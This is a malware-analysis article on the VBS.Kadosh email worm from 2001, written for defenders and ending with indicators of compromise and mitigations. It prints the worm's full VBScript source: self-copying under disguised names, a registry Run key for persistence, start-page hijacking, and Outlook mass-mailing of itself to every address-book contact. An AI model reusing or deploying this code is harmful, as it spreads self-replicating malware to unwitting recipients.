# Dissecting VBS.Kadosh: A Holiday-Themed Email Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.Kadosh is a Visual Basic Script (VBScript) worm attributed to the alias “PandaKiller” and dated early 2001. It exemplifies the era’s reliance on Windows Script Host (WSH) automation and Microsoft Outlook to propagate rapidly through email address books. The worm brands itself as harmless in its comments, yet it clearly performs self-replication, modifies browser settings, establishes persistence, and mass-mails copies of itself—behaviors that are characteristic of malware. 

Studying VBS.Kadosh’s source reveals how simple scripting primitives—file copying, registry writes, and Outlook automation—were enough to create impactful incidents before modern email content controls and endpoint protections were widespread. This analysis breaks down the worm’s flow from installation to propagation, highlights concrete indicators of compromise (IOCs), and outlines practical defenses that remain relevant today. While defenses have improved significantly, patterns like social engineering, default-permissive script execution, and automation APIs are still leveraged by modern threat actors.

## Section 1 – Overview of the Malware 🐛
VBS.Kadosh’s goals are straightforward: persist, alter browser behavior, and spread via email. On execution, the script copies itself into two system locations under deceptive filenames—one in the Windows directory and one in the System directory—so that it can be easily attached and discovered by the script later. It modifies the user’s web browser start page to a specific URL and registers a Run value so the worm launches at startup, ensuring continued presence. 

For propagation, VBS.Kadosh automates Microsoft Outlook to enumerate address lists and send a single BCC message per list to all entries. The chosen subject line (“Le Tour du Monde”) and friendly body text (“Voici une lettre qui va faire le tour du monde. Ouvre Vite”) are classic social-engineering hooks meant to drive curiosity. The email includes an attachment—the worm copy stored in the Windows directory—so that recipients are likely to launch it.

Kadosh targets common consumer Windows setups of the time with Outlook and WSH enabled, where VBScript attachments might execute with few warnings. There is no encryption, packing, or anti-debug logic; the worm depends on permissive defaults and human behavior. Its behavior set aligns with classic email worms that predate stricter attachment handling and modern endpoint protections.

## Section 2 – Source Code Analysis 🔬
The script is organized into a simple entry point (DEBUT) that orchestrates three operations: filesystem replication, browser/autorun modification, and email-based propagation.

### Installation and Replication
```vb
DEBUT()
Sub DEBUT()
Set a = CreateObject("Scripting.FileSystemObject")
Set win = a.GetSpecialFolder(0)
Set sys = a.GetSpecialFolder(1)
Set c = a.GetFile(WScript.ScriptFullName)
c.Copy(win & "\WinExec.exe.vbs")
c.Copy(sys & "\WinRun.dll.vbs")
INTERNET()
EMAIL()
msgbox "Le tour du monde en 20 jours", vbinformation
End Sub
```
- The worm instantiates a FileSystemObject (FSO) and resolves two special folders: 0 (Windows) and 1 (System).
- It makes two copies of itself with misleading names: `WinExec.exe.vbs` in the Windows directory and `WinRun.dll.vbs` in the System directory. The dual extensions (e.g., .exe.vbs) are meant to look like executables or DLLs in casual views.
- After replication, the code calls `INTERNET()` (for settings and persistence) and `EMAIL()` (for spread) and shows a benign informational message box—likely social flair to mask malicious activity.

### Browser Start Page and Persistence
```vb
Sub INTERNET()
Set W = Wscript.CreateObject("WScript.Shell")
W.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "live.multimania.com"
W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinExec", "C:\WINDOWS\WinExec.exe.vbs"
End Sub
```
- The script writes the Internet Explorer Start Page under HKCU to `live.multimania.com`. This forces users’ home page to a specific site on browser launch.
- It creates an autorun value under HKLM (affecting all users) named `WinExec`, pointing to the Windows copy (`C:\WINDOWS\WinExec.exe.vbs`). This ensures the worm starts at boot.
- Note the hardcoded Windows path. On systems where Windows lives in a different directory, this may fail; however, earlier the copy used `GetSpecialFolder(0)`, which generally resolves correctly. The mix of dynamic and hardcoded paths is common in older scripts and might reduce reliability but not intent.

### Email Propagation via Outlook
```vb
Sub EMAIL()
Set K = CreateObject("Outlook.Application")
Set L = K.GetNameSpace("MAPI")
For Each M In L.AddressLists
  If M.AddressEntries.Count <> 0 Then
    Set N = K.CreateItem(0)
    For O = 1 To M.AddressEntries.Count
      Set P = M.AddressEntries(O)
      If O = 1 Then
        N.BCC = P.Address
      Else
        N.BCC = N.BCC & "; " & P.Address
      End If
    Next
    N.Subject = "Le Tour du Monde"
    N.Body = "Voici une lettre qui va faire le tour du monde. Ouvre Vite"
    Set Q = CreateObject("Scripting.FileSystemObject")
    N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0), "WinExec.exe.vbs")
    N.Send
  End If
Next
End Sub
```
- The worm creates an Outlook Application object, obtains the MAPI namespace, and loops over every address list.
- It composes a single message per list and populates the BCC field with all addresses from that list. The use of BCC avoids visible mass-recipient indicators in the message headers.
- The subject and body are in French and aim to entice the recipient to open the attachment quickly—classic social engineering.
- The attachment is the worm copy from the Windows directory, retrieved using `GetSpecialFolder(0)` to construct the full path. This ensures the attached file exists even if the original was run from elsewhere.

### Observations and Quirks
- There is no anti-analysis functionality, obfuscation, or polymorphism; the script is human-readable and depends entirely on automation APIs.
- Combining an HKLM Run key (persistence) with start page tampering (user-visible change) is a simple tactic to ensure repeated execution while generating immediate effect.
- The comments in the file claim it is not a virus and that it is detected as VBS.NewLove.A. Regardless of the author’s intent, the behaviors—self-replication, persistence, and mass-mailing—are malicious from a defender’s perspective.

### Indicators of Compromise (IOCs)
- Files: `C:\WINDOWS\WinExec.exe.vbs`, `C:\WINDOWS\SYSTEM\WinRun.dll.vbs` (exact System path depends on OS).
- Registry (autorun): `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinExec = C:\WINDOWS\WinExec.exe.vbs`.
- Registry (browser): `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page = live.multimania.com`.
- Email artifacts: Messages with subject “Le Tour du Monde” and a VBScript attachment named `WinExec.exe.vbs` sent to many recipients via BCC.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Restrict script execution. Disable Windows Script Host (WSH) for standard users or entirely where not needed. Use application control (AppLocker/WDAC) to block wscript.exe/cscript.exe except for approved paths and publishers.
- Harden email handling. Configure mail gateways to block or quarantine VBScript attachments, and to flag messages with unusually large BCC lists. Use attachment sandboxing and content disarm and reconstruction (CDR) for high-risk formats.
- Monitor and prevent autoruns. Alert on new or changed values under `HKLM\...\Run`. A newly added `WinExec` value pointing to a `.vbs` file in `C:\WINDOWS\` should be considered high-risk.
- Watch browser settings changes. Detect writes to `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page`, especially when the value changes to an unexpected domain.
- Endpoint detection and response (EDR). Create detections for Outlook automation spawning or being driven by scripts, as well as for wscript.exe accessing address book data or attaching files from the Windows folder.
- User awareness. Educate users to avoid opening unsolicited script attachments and to be suspicious of pressure-language subjects (“open quickly”) even when they appear in familiar languages.
- Principle of least privilege. Running without administrative rights can block the HKLM Run write, reducing persistence options for scripts like Kadosh.
- Backup and recovery. While the worm isn’t destructive, having rapid rollback for configuration changes (e.g., home page settings) and robust endpoint baselines accelerates cleanup.

## Conclusion
VBS.Kadosh is emblematic of early 2000s email worms: minimal code, maximum leverage of default-permissive client automation. It copies itself to trusted-looking locations, changes visible browser settings, and abuses Outlook to blast an attached copy to as many contacts as possible. There is no sophisticated evasion, only simple trickery such as dual file extensions and friendly French-language messages that urge quick action. For defenders, the code underscores the importance of curbing script execution, instrumenting registry and email behaviors, and educating users about risky attachments. The same fundamental controls that defeat Kadosh also blunt contemporary script-based threats that attempt to revive these old playbooks.
